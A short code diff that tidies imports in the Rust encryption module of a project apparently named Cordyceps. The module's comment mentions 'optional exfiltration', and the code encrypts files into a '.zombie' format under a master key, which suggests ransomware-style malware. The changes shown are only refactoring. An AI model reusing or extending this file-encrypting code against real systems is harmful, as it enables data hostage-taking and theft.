@@ -5,16 +5,17 @@
 //! routines, and is responsible for handling cryptographic workflows,
 //! such as file processing, key usage, and optional exfiltration.
 
-use std::fs::{File, read_to_string};
-use std::io::{self, Read, Write};
-use std::path::{Path, PathBuf};
+use std::{
+    fs::{File, read_to_string},
+    io::{self, Read, Write},
+    path::{Path, PathBuf},
+};
 
 use aes_gcm::{
     Aes256Gcm,
     aead::{Aead, KeyInit, Nonce},
 };
-use base64::Engine;
-use base64::engine::general_purpose::STANDARD_NO_PAD;
+use base64::{Engine, engine::general_purpose::STANDARD_NO_PAD};
 use hkdf::Hkdf;
 use log::{debug, error, info};
 use rand::{RngCore, rngs::OsRng};
@@ -27,6 +28,7 @@ pub const EXTENSION: &'static str = "zombie";
 
 /// Magic bytes to identify Cordyceps encrypted files
 const MAGIC_BYTES: &[u8; 4] = b"CORD";
+
 /// .zombie file format version
 const FILE_FORMAT_VERSION: u8 = 0x01;
 
@@ -64,7 +66,7 @@ pub fn encrypt(path: &Path, master_pk_bytes: &[u8; 32]) -> Result<PathBuf, Crypt
     info!("Starting encryption for file: {:?}", path);
 
     // 1. Read file content
-    let mut file = std::fs::File::open(path)?;
+    let mut file = File::open(path)?;
     let mut plaintext = Vec::new();
     file.read_to_end(&mut plaintext)?; // TODO: read file by chunks
     debug!("Read {} bytes from {:?}", plaintext.len(), path);
